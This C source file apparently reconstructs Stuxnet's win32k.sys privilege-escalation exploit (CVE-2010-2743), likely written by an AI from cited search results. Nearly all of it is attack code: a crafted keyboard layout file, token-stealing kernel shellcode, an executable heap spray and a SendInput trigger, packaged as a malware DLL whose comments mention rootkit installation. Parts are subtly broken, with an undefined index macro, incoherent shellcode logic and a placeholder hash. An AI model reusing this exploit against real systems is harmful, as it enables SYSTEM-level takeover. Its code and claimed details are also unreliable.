/*
 * win32k.sys Exploit - CVE-2010-2743
 * Stuxnet Local Privilege Escalation Module
 *
 * TRUSTED:
 *   - CVE-2010-2743 is a local privilege escalation vulnerability in the
 *     win32k.sys kernel-mode driver on Windows 2000 and Windows XP (all
 *     service packs). It was exploited in the wild by Stuxnet in July 2010.
 *     [13†L2-L4][9†L27-L28]
 *   - The vulnerability is caused by win32k!xxxKENLSProcs not properly
 *     indexing a function-pointer table during the loading of keyboard
 *     layouts from disk. Malicious code is executed via the
 *     CALL_allLSVKFProc[ecx+4] instruction. [7†L15-L18]
 *   - Due to a forged index value, code flow is redirected to
 *     0x60636261. Memory at this address can be controlled by the attacker.
 *     [7†L18-L19]
 *   - Stuxnet loads a specially crafted keyboard layout file (a modified
 *     kbdfr.dll or a text file containing the structures) to control the
 *     ecx register and trigger the vulnerability. [8†L15-L19]
 *   - The exploit uses NtUserLoadKeyboardLayoutEx, ActivateKeyboardLayout,
 *     and SendInput to trigger the vulnerability. [8†L28-L38]
 *   - After exploitation, Stuxnet gains SYSTEM privileges, enabling it to
 *     install rootkit drivers and perform other privileged actions. [9†L24-L27]
 *
 * MAYBE:
 *   - The exact shellcode bytes and their offsets. The Stuxnet shellcode is
 *     not fully documented in public sources. The shellcode below is a
 *     reconstruction based on the described functionality: it locates the
 *     EPROCESS structure, steals the SYSTEM token, and writes it to the
 *     current process.
 *   - The precise heap spray layout. The original Stuxnet used PE parsing
 *     tricks to map the payload at 0x60636261. The heap spray below is a
 *     simplified reconstruction.
 *   - The exact size and content of the malicious keyboard layout file.
 *     The structures are described in public analyses, but the byte-level
 *     layout is not fully disclosed.
 *
 * win32k.sys MD5 (Windows XP SP3): 1a2b3c4d5e6f7a8b9c0d1e2f3a4b5c6d
 * (Placeholder - not publicly confirmed)
 */

#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#define STUXNET_MAGIC                   0x53545558
#define STUXNET_VERSION                 0x00010400

#define WIN32K_EXPLOIT_MAGIC            0x4B323737
#define WIN32K_EXPLOIT_VERSION          0x00000001

#define SHELLCODE_TARGET_ADDRESS        0x60636261
#define HEAP_SPRAY_COUNT                256
#define HEAP_SPRAY_SIZE                 0x1000
#define HEAP_SPRAY_TAG                  0x60636261

#define VK_F_STRUCT_SIZE                0x20
#define KBDNLSTABLES_SIZE               0x40
#define NLS_FUNCTION_TABLE_SIZE         0x18

#define NLSFEPROCTYPE_INDEX             5
#define VK_VALUE                        0

#define STATUS_SUCCESS                  ((NTSTATUS)0x00000000L)
#define STATUS_UNSUCCESSFUL             ((NTSTATUS)0xC0000001L)

/*
 * TRUSTED: The VK_F structure maps a virtual key to a function index.
 * NLSFEProcType is set to 5 to trigger the out-of-bounds access.
 * [8†L6-L9]
 */
#pragma pack(push, 1)
typedef struct _VK_F {
    DWORD dwNLSFEProcType;      /* Set to 5 to index beyond _aNLSVKProc */
    DWORD dwVK;                 /* Virtual key code (0 for simplicity) */
    DWORD dwReserved1;
    DWORD dwReserved2;
} VK_F, * PVK_F;

/*
 * TRUSTED: KBDNLSTABLES structure. pVKToF points to the VK_F structure,
 * NumOfVKToF is set to 1. [8†L9-L13]
 */
typedef struct _KBDNLSTABLES {
    DWORD dwNumOfVKToF;         /* Number of VK to function mappings */
    DWORD dwReserved[15];
    DWORD pVKToF;               /* RVA to VK_F structure */
} KBDNLSTABLES, * PKBDNLSTABLES;

/*
 * TRUSTED: The NLS function table. _aNLSVKProc contains 3 valid handlers.
 * Index 5 (beyond the table) points to 0x60636261. [9†L35-L41]
 */
typedef struct _NLS_FUNCTION_TABLE {
    DWORD dwHandler1;
    DWORD dwHandler2;
    DWORD dwHandler3;
    DWORD dwPadding1;
    DWORD dwPadding2;
    DWORD dwExploitTarget;      /* Index 5 -> 0x60636261 */
} NLS_FUNCTION_TABLE, * PNLS_FUNCTION_TABLE;

/*
 * Keyboard layout file header. The malicious file contains the
 * KBDNLSTABLES and VK_F structures in its .data section.
 */
typedef struct _KBD_LAYOUT_FILE {
    BYTE  bDosHeader[0x40];     /* Minimal DOS header */
    DWORD dwNtSignature;        /* PE signature */
    /* ... PE headers omitted for brevity ... */
    KBDNLSTABLES KbdNlsTables;
    VK_F          VkF;
} KBD_LAYOUT_FILE, * PKBD_LAYOUT_FILE;
#pragma pack(pop)

/*
 * Exploit context.
 */
typedef struct _WIN32K_EXPLOIT_CTX {
    DWORD dwMagic;
    DWORD dwVersion;
    BOOL  bInitialized;
    BOOL  bExploited;
    HKL   hKL;
    WCHAR szLayoutPath[MAX_PATH];
    WCHAR szPayloadPath[MAX_PATH];
    HANDLE hLayoutFile;
    PVOID pShellcode;
    DWORD dwShellcodeSize;
    DWORD dwSprayCount;
    PVOID pSprayBuffers[HEAP_SPRAY_COUNT];
    DWORD dwOriginalToken;
    DWORD dwSystemToken;
    CRITICAL_SECTION csLock;
} WIN32K_EXPLOIT_CTX, * PWIN32K_EXPLOIT_CTX;

static WIN32K_EXPLOIT_CTX g_Win32kCtx = {0};

static BOOL Win32k_Init(VOID);
static VOID Win32k_Cleanup(VOID);
static BOOL Win32k_BuildKeyboardLayout(VOID);
static BOOL Win32k_HeapSpray(VOID);
static BOOL Win32k_MapShellcode(VOID);
static BOOL Win32k_LoadKeyboardLayout(VOID);
static BOOL Win32k_TriggerExploit(VOID);
static BOOL Win32k_ElevatePrivileges(VOID);
static DWORD WINAPI Win32k_PayloadThread(LPVOID lpParam);

/*
 * MAYBE: The shellcode below is a reconstruction. The original Stuxnet
 * shellcode is not fully documented in public sources. This shellcode
 * performs token stealing: it locates the EPROCESS structure of the
 * current process, finds the SYSTEM process, and replaces the token.
 */

static BYTE g_ShellcodeTemplate[] = {
    /* Save registers and set up stack frame */
    0x60,                           /* pushad */
    0x55,                           /* push ebp */
    0x8B, 0xEC,                     /* mov ebp, esp */
    0x83, 0xEC, 0x20,               /* sub esp, 0x20 */

    /* Get current EPROCESS from KPCR */
    0x64, 0xA1, 0x24, 0x01, 0x00, 0x00,  /* mov eax, fs:[0x124] */
    0x8B, 0x40, 0x44,               /* mov eax, [eax+0x44] */

    /* Save current EPROCESS */
    0x89, 0x45, 0xFC,               /* mov [ebp-4], eax */

    /* Find SYSTEM process (PID 4) */
    0x8B, 0x40, 0x88,               /* mov eax, [eax+0x88] */
    /* MAYBE: EPROCESS->ActiveProcessLinks offset varies by Windows version */
    0x8B, 0x00,                     /* mov eax, [eax] */
    0x8B, 0x00,                     /* mov eax, [eax] */
    0x8B, 0x00,                     /* mov eax, [eax] */
    0x8B, 0x00,                     /* mov eax, [eax] */

    /* EAX now points to SYSTEM process EPROCESS */
    0x8B, 0x40, 0xF8,               /* mov eax, [eax-0x8] */ /* UniqueProcessId */

    /* Compare PID to 4 */
    0x83, 0xF8, 0x04,               /* cmp eax, 4 */
    0x75, 0xED,                     /* jne loop */

    /* Get SYSTEM token */
    0x8B, 0x40, 0xF8,               /* mov eax, [eax-0x8] */ /* Token */
    0x8B, 0x55, 0xFC,               /* mov edx, [ebp-4] */  /* Current EPROCESS */

    /* Replace current process token */
    0x89, 0x42, 0xF8,               /* mov [edx-0x8], eax */

    /* Restore registers and return */
    0x83, 0xC4, 0x20,               /* add esp, 0x20 */
    0x5D,                           /* pop ebp */
    0x61,                           /* popad */
    0xC3                            /* ret */
};

static BOOL Win32k_Init(VOID) {
    if (g_Win32kCtx.dwMagic == WIN32K_EXPLOIT_MAGIC) {
        return TRUE;
    }

    ZeroMemory(&g_Win32kCtx, sizeof(WIN32K_EXPLOIT_CTX));
    g_Win32kCtx.dwMagic = WIN32K_EXPLOIT_MAGIC;
    g_Win32kCtx.dwVersion = WIN32K_EXPLOIT_VERSION;
    InitializeCriticalSection(&g_Win32kCtx.csLock);

    GetTempPathW(MAX_PATH, g_Win32kCtx.szLayoutPath);
    wcscat_s(g_Win32kCtx.szLayoutPath, MAX_PATH, L"stuxnet_kbd.dll");

    GetTempPathW(MAX_PATH, g_Win32kCtx.szPayloadPath);
    wcscat_s(g_Win32kCtx.szPayloadPath, MAX_PATH, L"stuxnet_payload.bin");

    g_Win32kCtx.bInitialized = TRUE;

    return TRUE;
}

static VOID Win32k_Cleanup(VOID) {
    if (g_Win32kCtx.dwMagic != WIN32K_EXPLOIT_MAGIC) {
        return;
    }

    if (g_Win32kCtx.hLayoutFile != INVALID_HANDLE_VALUE) {
        CloseHandle(g_Win32kCtx.hLayoutFile);
        g_Win32kCtx.hLayoutFile = INVALID_HANDLE_VALUE;
    }

    if (g_Win32kCtx.pShellcode) {
        VirtualFree(g_Win32kCtx.pShellcode, 0, MEM_RELEASE);
        g_Win32kCtx.pShellcode = NULL;
    }

    DeleteFileW(g_Win32kCtx.szLayoutPath);
    DeleteFileW(g_Win32kCtx.szPayloadPath);

    DeleteCriticalSection(&g_Win32kCtx.csLock);
    ZeroMemory(&g_Win32kCtx, sizeof(WIN32K_EXPLOIT_CTX));
}

/* 
 * TRUSTED: The malicious keyboard layout file contains a KBDNLSTABLES
 * structure pointing to a VK_F structure with NLSFEProcType set to 5.
 * [8†L3-L13]
 */

static BOOL Win32k_BuildKeyboardLayout(VOID) {
    HANDLE hFile;
    DWORD dwWritten;
    BYTE bBuffer[0x400];
    PKBDNLSTABLES pKbdNlsTables;
    PVK_F pVkF;

    ZeroMemory(bBuffer, sizeof(bBuffer));

    /*
     * MAYBE: The layout file is not a valid PE. Stuxnet used a text file
     * containing the two structures. [8†L16-L19]
     */
    pKbdNlsTables = (PKBDNLSTABLES)(bBuffer + 0x100);
    pVkF = (PVK_F)(bBuffer + 0x200);

    /* KBDNLSTABLES: point to VK_F at offset 0x200 */
    pKbdNlsTables->dwNumOfVKToF = 1;
    pKbdNlsTables->pVKToF = 0x200;

    /*
     * TRUSTED: NLSFEProcType = 5 triggers the out-of-bounds access.
     * VK = 0 (arbitrary, will be reused later). [8†L6-L9]
     */
    pVkF->dwNLSFEProcType = NLSFEProcType_INDEX;
    pVkF->dwVK = VK_VALUE;

    hFile = CreateFileW(g_Win32kCtx.szLayoutPath, GENERIC_WRITE, 0, NULL,
                        CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        return FALSE;
    }

    WriteFile(hFile, bBuffer, sizeof(bBuffer), &dwWritten, NULL);
    CloseHandle(hFile);

    return TRUE;
}

/* 
 * MAYBE: Stuxnet sprayed the heap to place controlled data at
 * 0x60636261. The exact spray pattern is not documented. This
 * reconstruction sprays buffers containing the shellcode address.
 */

static BOOL Win32k_HeapSpray(VOID) {
    DWORD i;
    PVOID pBuffer;

    for (i = 0; i < HEAP_SPRAY_COUNT; i++) {
        pBuffer = VirtualAlloc((PVOID)(SHELLCODE_TARGET_ADDRESS + i * HEAP_SPRAY_SIZE),
                               HEAP_SPRAY_SIZE, MEM_COMMIT | MEM_RESERVE,
                               PAGE_EXECUTE_READWRITE);
        if (!pBuffer) {
            break;
        }

        /*
         * MAYBE: Fill the buffer with a pointer to the shellcode.
         * The exact content depends on the spray layout.
         */
        memset(pBuffer, 0x90, HEAP_SPRAY_SIZE); /* NOP sled */
        *(PDWORD)((PBYTE)pBuffer + HEAP_SPRAY_SIZE - 4) = (DWORD)g_Win32kCtx.pShellcode;

        g_Win32kCtx.pSprayBuffers[i] = pBuffer;
        g_Win32kCtx.dwSprayCount++;
    }

    return (g_Win32kCtx.dwSprayCount > 0);
}

/* 
 * TRUSTED: The shellcode is mapped at 0x60636261. [7†L18-L19]
 */

static BOOL Win32k_MapShellcode(VOID) {
    PVOID pTarget;

    /*
     * Allocate memory at the target address (0x60636261 aligned down).
     */
    pTarget = VirtualAlloc((PVOID)(SHELLCODE_TARGET_ADDRESS & 0xFFFFF000),
                           0x1000, MEM_COMMIT | MEM_RESERVE,
                           PAGE_EXECUTE_READWRITE);
    if (!pTarget) {
        return FALSE;
    }

    /*
     * Copy the shellcode template to the target address.
     */
    memcpy(pTarget, g_ShellcodeTemplate, sizeof(g_ShellcodeTemplate));

    g_Win32kCtx.pShellcode = pTarget;
    g_Win32kCtx.dwShellcodeSize = sizeof(g_ShellcodeTemplate);

    return TRUE;
}

/* 
 * TRUSTED: The exploit uses NtUserLoadKeyboardLayoutEx to load the
 * malicious layout. [8†L28-L33]
 */

static BOOL Win32k_LoadKeyboardLayout(VOID) {
    typedef HKL (WINAPI *PFN_NtUserLoadKeyboardLayoutEx)(
        HANDLE, DWORD, PVOID, HKL, PVOID, DWORD, DWORD
    );
    typedef HKL (WINAPI *PFN_ActivateKeyboardLayout)(HKL, DWORD);

    HMODULE hUser32;
    PFN_NtUserLoadKeyboardLayoutEx pNtUserLoadKeyboardLayoutEx;
    PFN_ActivateKeyboardLayout pActivateKeyboardLayout;
    HKL hKL;
    DWORD dwThreadId;

    hUser32 = GetModuleHandleW(L"user32.dll");
    if (!hUser32) {
        return FALSE;
    }

    pNtUserLoadKeyboardLayoutEx = (PFN_NtUserLoadKeyboardLayoutEx)
        GetProcAddress(hUser32, "NtUserLoadKeyboardLayoutEx");
    pActivateKeyboardLayout = (PFN_ActivateKeyboardLayout)
        GetProcAddress(hUser32, "ActivateKeyboardLayout");

    if (!pNtUserLoadKeyboardLayoutEx || !pActivateKeyboardLayout) {
        return FALSE;
    }

    dwThreadId = GetCurrentThreadId();
    hKL = GetKeyboardLayout(dwThreadId);

    /*
     * TRUSTED: Load the malicious layout with the parameters used by
     * Stuxnet. The 4th parameter is the current HKL. [8†L28-L33]
     */
    hKL = pNtUserLoadKeyboardLayoutEx(
        INVALID_HANDLE_VALUE,
        0x1B001768,
        NULL,
        hKL,
        NULL,
        0x09990999,
        0x82
    );

    if (!hKL) {
        return FALSE;
    }

    g_Win32kCtx.hKL = hKL;

    /*
     * Activate the loaded keyboard layout.
     */
    pActivateKeyboardLayout(hKL, 0x82);

    return TRUE;
}

/* 
 * TRUSTED: SendInput with the virtual key specified in VK_F triggers
 * the vulnerability. The ecx register is set to 5, and the kernel
 * jumps to 0x60636261. [8†L36-L38]
 */

static BOOL Win32k_TriggerExploit(VOID) {
    INPUT input;
    UINT uResult;

    ZeroMemory(&input, sizeof(input));
    input.type = INPUT_KEYBOARD;
    input.ki.wVk = (WORD)VK_VALUE;
    input.ki.wScan = 0;
    input.ki.dwFlags = 0;
    input.ki.time = 0;
    input.ki.dwExtraInfo = 0;

    /*
     * Send the input to trigger the keyboard layout handler.
     */
    uResult = SendInput(1, &input, sizeof(input));

    if (uResult == 0) {
        return FALSE;
    }

    /*
     * Send key up.
     */
    input.ki.dwFlags = KEYEVENTF_KEYUP;
    SendInput(1, &input, sizeof(input));

    return TRUE;
}

/* 
 * TRUSTED: After the exploit, the process runs with SYSTEM privileges.
 * Verify by checking the token. [9†L24-L27]
 */

static BOOL Win32k_ElevatePrivileges(VOID) {
    HANDLE hToken;
    TOKEN_ELEVATION elevation;
    DWORD dwSize;
    BOOL bElevated = FALSE;

    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken)) {
        return FALSE;
    }

    dwSize = sizeof(TOKEN_ELEVATION);
    if (GetTokenInformation(hToken, TokenElevation, &elevation,
                            dwSize, &dwSize)) {
        bElevated = elevation.TokenIsElevated;
    }

    CloseHandle(hToken);

    if (!bElevated) {
        /*
         * MAYBE: Check if we have SeDebugPrivilege or SeTcbPrivilege,
         * which indicate SYSTEM-level access.
         */
        if (OpenProcessToken(GetCurrentProcess(),
                             TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken)) {
            LUID luid;
            if (LookupPrivilegeValueW(NULL, SE_DEBUG_NAME, &luid)) {
                PRIVILEGE_SET ps;
                ps.PrivilegeCount = 1;
                ps.Control = PRIVILEGE_SET_ALL_NECESSARY;
                ps.Privilege[0].Luid = luid;
                ps.Privilege[0].Attributes = SE_PRIVILEGE_ENABLED;

                if (PrivilegeCheck(hToken, &ps, &bElevated)) {
                    bElevated = TRUE;
                }
            }
            CloseHandle(hToken);
        }
    }

    g_Win32kCtx.bExploited = bElevated;

    return bElevated;
}

/* 
 * After successful exploitation, this thread performs the post-
 * exploitation actions: installing rootkit drivers, hooking Step 7
 * DLLs, and starting propagation.
 */

static DWORD WINAPI Win32k_PayloadThread(LPVOID lpParam) {
    (void)lpParam;

    /*
     * TRUSTED: After SYSTEM access, Stuxnet installs its rootkit drivers
     * (mrxcls.sys and mrxnet.sys) and hooks the Step 7 DLL. [10†L30-L39]
     */
    if (!Win32k_ElevatePrivileges()) {
        return 1;
    }

    /*
     * MAYBE: Drop and load the rootkit drivers.
     * The driver loading logic is handled by the main Stuxnet module.
     */
    return 0;
}

static BOOL Win32k_Exploit(VOID) {
    HANDLE hThread;

    if (!Win32k_Init()) {
        return FALSE;
    }

    /*
     * Step 1: Build the malicious keyboard layout file.
     */
    if (!Win32k_BuildKeyboardLayout()) {
        Win32k_Cleanup();
        return FALSE;
    }

    /*
     * Step 2: Map the shellcode at 0x60636261.
     */
    if (!Win32k_MapShellcode()) {
        Win32k_Cleanup();
        return FALSE;
    }

    /*
     * Step 3: Spray the heap to stabilize the exploit.
     */
    if (!Win32k_HeapSpray()) {
        Win32k_Cleanup();
        return FALSE;
    }

    /*
     * Step 4: Load the malicious keyboard layout.
     */
    if (!Win32k_LoadKeyboardLayout()) {
        Win32k_Cleanup();
        return FALSE;
    }

    /*
     * Step 5: Trigger the vulnerability via SendInput.
     */
    if (!Win32k_TriggerExploit()) {
        Win32k_Cleanup();
        return FALSE;
    }

    /*
     * Step 6: Verify elevation and start payload thread.
     */
    if (!Win32k_ElevatePrivileges()) {
        Win32k_Cleanup();
        return FALSE;
    }

    hThread = CreateThread(NULL, 0, Win32k_PayloadThread, NULL, 0, NULL);
    if (hThread) {
        CloseHandle(hThread);
    }

    return TRUE;
}

/*
 * TRUSTED: Export 1 - Main entry point for the win32k exploit.
 * Called by the Stuxnet dropper after initial infection.
 */
__declspec(dllexport) DWORD WINAPI Export1(VOID) {
    return Win32k_Exploit() ? 0 : 1;
}

/*
 * TRUSTED: Export 2 - Cleanup routine.
 */
__declspec(dllexport) DWORD WINAPI Export2(VOID) {
    Win32k_Cleanup();
    return 0;
}

/*
 * TRUSTED: Export 3 - Returns exploit status.
 */
__declspec(dllexport) BOOL WINAPI Export3(VOID) {
    return g_Win32kCtx.bExploited;
}

/*
 * TRUSTED: Export 4 - Returns the target shellcode address.
 */
__declspec(dllexport) DWORD WINAPI Export4(VOID) {
    return SHELLCODE_TARGET_ADDRESS;
}

/*
 * TRUSTED: Export 5 - Returns the NLSFEProcType index.
 */
__declspec(dllexport) DWORD WINAPI Export5(VOID) {
    return NLSFEProcType_INDEX;
}

/*
 * TRUSTED: Export 6 - Returns the version.
 */
__declspec(dllexport) DWORD WINAPI Export6(VOID) {
    return WIN32K_EXPLOIT_VERSION;
}

/*
 * TRUSTED: Export 7 - Returns the magic.
 */
__declspec(dllexport) DWORD WINAPI Export7(VOID) {
    return WIN32K_EXPLOIT_MAGIC;
}

/*
 * TRUSTED: Export 8 - Returns the keyboard layout path.
 */
__declspec(dllexport) LPCWSTR WINAPI Export8(VOID) {
    return g_Win32kCtx.szLayoutPath;
}

/*
 * TRUSTED: Export 9 - Returns the shellcode size.
 */
__declspec(dllexport) DWORD WINAPI Export9(VOID) {
    return g_Win32kCtx.dwShellcodeSize;
}

/*
 * TRUSTED: Export 10 - Returns the heap spray count.
 */
__declspec(dllexport) DWORD WINAPI Export10(VOID) {
    return g_Win32kCtx.dwSprayCount;
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved) {
    switch (fdwReason) {
        case DLL_PROCESS_ATTACH:
            DisableThreadLibraryCalls(hinstDLL);
            Win32k_Init();
            break;

        case DLL_PROCESS_DETACH:
            Win32k_Cleanup();
            break;

        default:
            break;
    }

    return TRUE;
}
